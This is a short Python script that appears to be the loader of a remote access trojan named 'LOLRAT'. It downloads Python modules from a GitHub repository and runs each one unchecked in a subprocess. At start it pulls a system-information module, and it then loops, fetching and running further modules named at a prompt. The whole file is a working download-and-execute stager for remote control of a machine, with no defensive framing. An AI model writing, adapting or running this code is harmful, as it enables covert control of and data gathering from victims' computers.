import os
import subprocess
import sys
import requests
import socket

NameOfModule = "exec"
arguments = [""]

def fetch_url_and_execute_cmd(url, *args):
    try:
        # Fetch content from the URL
        response = requests.get(url)
        
        if response.status_code == 200:
            content = response.text

            # Execute the content as a subprocess and capture the output
            command = ["python", "-c", content, *args]
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            # Print the output of the executed command
            if result.returncode == 0:
                print(result.stdout)
                return result.stdout
            
            elif result.returncode != 0:
                print(f"Command failed with error: {result.stderr}")
                return result.stderr
        else:
            print(f"Failed to retrieve content from the URL. Status Code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

# Get System information
url = f"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/sysInfo.py"
fetch_url_and_execute_cmd(url, *arguments)

while True:
    NameOfModule = input("Enter the NameOfModule (e.g., 'exec'): ")
    if not NameOfModule:
        break

    arguments = input("Enter the arguments (space-separated): ").split()

    url = f"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/{NameOfModule}.py"
    fetch_url_and_execute_cmd(url, *arguments)

